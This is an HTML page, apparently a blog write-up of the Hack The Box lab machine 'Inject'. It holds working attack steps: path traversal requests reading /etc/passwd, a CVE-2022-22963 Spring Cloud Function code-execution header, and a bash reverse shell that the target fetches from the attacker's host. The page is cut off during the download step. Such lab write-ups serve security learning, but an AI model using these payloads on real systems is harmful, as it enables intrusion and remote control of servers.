@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB Writeup - Inject (Easy) :: CyberSpider</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Inject is a easy difficulty linux box." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/inject/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="CyberSpider" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB Writeup - Inject (Easy)">
+<meta property="og:description" content="Inject is a easy difficulty linux box." />
+<meta property="og:url" content="/posts/inject/" />
+<meta property="og:site_name" content="CyberSpider" />
+
+  
+    <meta property="og:image" content="/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-07-03 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cyberspider@ubuntu:~$
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/archive">archive</a></li>
+        
+      
+        
+          <li><a href="/search">search</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/archive" >archive</a></li>
+        
+      
+        
+          <li><a href="/search" >search</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/inject/">HTB Writeup - Inject (Easy)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-07-03</time><span class="post-author">CyberSpider</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/htb/">htb</a>&nbsp;
+      
+      #<a href="/tags/easy/">easy</a>&nbsp;
+      
+      #<a href="/tags/linux/">linux</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>The <code>Inject</code> machine is an easy linux box.</p>
+<p><img src="/images/Inject.png#center" alt="Scenario 1: Across columns"></p>
+<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a scan with <code>nmap</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -A -sV -sC 10.129.147.219 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-03-14 17:24 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.147.219
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.042s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> caf10c515a596277f0a80c5c7c8ddaf8 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> d51c81c97b076b1cc1b429254b52219f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> db1d8ceb9472b0d3ed44b96c93a7f91d <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>8080/tcp open  nagios-nsca Nagios NSCA
+</span></span><span style="display:flex;"><span>|_http-open-proxy: Proxy might be redirecting requests
+</span></span><span style="display:flex;"><span>|_http-title: Home
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.22 seconds
+</span></span></code></pre></div><h2 id="directory-enumeration">Directory Enumeration<a href="#directory-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a directory enumeration with <code>gobuster</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u http://10.129.147.219:8080/  -w  /usr/share/wordlists/dirb/big.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.4
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.129.147.219:8080/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirb/big.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.4
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2023/03/14 17:28:51 Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/<span style="color:#f92672">[</span>                    <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 435<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/<span style="color:#f92672">]</span>                    <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 435<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/blogs                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 5371<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/environment          <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 712<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/error                <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 106<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/plain<span style="color:#f92672">]</span>               <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 435<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/quote<span style="color:#f92672">]</span>               <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 435<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/register             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 5654<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/upload               <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1857<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">20389</span> / <span style="color:#ae81ff">20473</span> <span style="color:#f92672">(</span>99.59%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2023/03/14 17:31:02 Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><h2 id="command-injection">Command Injection<a href="#command-injection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I see that the page of register  is in manutention, thereby I see the directory of upload, but this component upload only the  images, so I must find a possible vulnerabilities that inject the code via a  file  image</p>
+<p>I upload an image, than I see a link, I click the link and I see a parameter <code>img</code>, I try to inject this <code>../../../../../../../etc/passwd</code> and this works</p>
+<p>&ndash;&gt; Request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /show_image?img=../../../../../../../etc/passwd <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.204:8080</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.11.204:8080/upload</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span></code></pre></div><p>&ndash;&gt; Response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">HTTP/1.1 200 
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Accept-Ranges: bytes
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type: image/jpeg
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length: 1986
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Date: Thu, 23 Mar 2023 19:36:14 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">root:x:0:0:root:/root:/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">sync:x:4:65534:sync:/bin:/bin/sync
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">pollinate:x:110:1::/var/cache/pollinate:/bin/false
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">frank:x:1000:1000:frank:/home/frank:/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">phil:x:1001:1001::/home/phil:/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">_laurel:x:997:996::/var/log/laurel:/bin/false
+</span></span></span></code></pre></div><p>After a lot of enumeration I discover this file:</p>
+<p>&ndash;&gt; Request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /show_image?img=../../../../../../etc/systemd/system/webapp.service  <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.204:8080</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span></code></pre></div><p>&ndash;&gt; Response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">HTTP/1.1 200 
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Accept-Ranges: bytes
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type: image/jpeg
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length: 262
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Date: Fri, 24 Mar 2023 19:14:39 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[Unit]
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Description=Spring WEb APP
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">After=syslog.target
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[Service]
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">User=frank
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Group=frank
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">ExecStart=/usr/bin/java -Ddebug -jar /var/www/WebApp/target/spring-webapp.jar
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Restart=always
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">StandardOutput=syslog
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">StandardError=syslog
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[Install]
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">WantedBy=multi-user.target
+</span></span></span></code></pre></div><p>I have discover a service <code>Spring WEb APP</code>, I find a <code>CVE</code> to this service <code>[CVE-2022-22963](https://github.com/me2nuk/CVE-2022-22963)</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -X POST  http://10.10.11.204:8080/functionRouter -H <span style="color:#e6db74">&#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&#34;touch /tmp/pwned&#34;)&#39;</span> --data-raw <span style="color:#e6db74">&#39;data&#39;</span> -v
+</span></span><span style="display:flex;"><span>Note: Unnecessary use of -X or --request, POST is already inferred.
+</span></span><span style="display:flex;"><span>*   Trying 10.10.11.204:8080...
+</span></span><span style="display:flex;"><span>* Connected to 10.10.11.204 <span style="color:#f92672">(</span>10.10.11.204<span style="color:#f92672">)</span> port <span style="color:#ae81ff">8080</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
+</span></span><span style="display:flex;"><span>&gt; POST /functionRouter HTTP/1.1
+</span></span><span style="display:flex;"><span>&gt; Host: 10.10.11.204:8080
+</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/7.88.1
+</span></span><span style="display:flex;"><span>&gt; Accept: */*
+</span></span><span style="display:flex;"><span>&gt; spring.cloud.function.routing-expression:T<span style="color:#f92672">(</span>java.lang.Runtime<span style="color:#f92672">)</span>.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;touch /tmp/pwned&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>&gt; Content-Length: <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>&gt; Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>&gt; 
+</span></span><span style="display:flex;"><span>&lt; HTTP/1.1 <span style="color:#ae81ff">500</span> 
+</span></span><span style="display:flex;"><span>&lt; Content-Type: application/json
+</span></span><span style="display:flex;"><span>&lt; Transfer-Encoding: chunked
+</span></span><span style="display:flex;"><span>&lt; Date: Fri, <span style="color:#ae81ff">24</span> Mar <span style="color:#ae81ff">2023</span> 19:20:52 GMT
+</span></span><span style="display:flex;"><span>&lt; Connection: close
+</span></span><span style="display:flex;"><span>&lt; 
+</span></span><span style="display:flex;"><span>* Closing connection <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;timestamp&#34;</span>:<span style="color:#e6db74">&#34;2023-03-24T19:20:53.546+00:00&#34;</span>,<span style="color:#e6db74">&#34;status&#34;</span>:500,<span style="color:#e6db74">&#34;error&#34;</span>:<span style="color:#e6db74">&#34;Internal Server Error&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&#34;</span>,<span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;/functionRouter&#34;</span><span style="color:#f92672">}</span> 
+</span></span></code></pre></div><p>I write a reverse shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nano reverseshell.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat reverseshell.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bash -i &gt;&amp; /dev/tcp/10.10.14.248/9001 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>I make the target machine make a request to the local machine to download the reverse shell:</p>
+<p>&ndash;&gt; I open a <code>web server</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">9001</span> <span style="color:#f92672">(</span>http://0.0.0.0:9001/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><p>&ndash;&gt; I open a <code>listening port</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -lnvp <span style="color:#ae81ff">9001</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
+</span></span></code></pre></div><p>&ndash;&gt; I make a request to myself from the Target Machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -X POST  http://10.10.11.204:8080/functionRouter -H <span style="color:#e6db74">&#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&#34;curl 10.10.14.248:80/reverseshell.sh -o /tmp/rev&#34;)&#39;</span> --data-raw <span style="color:#e6db74">&#39;data&#39;</span> -v
+</span></span><span style="display:flex;"><span>Note: Unnecessary use of -X or --request, POST is already inferred.
+</span></span><span style="display:flex;"><span>*   Trying 10.10.11.204:8080...
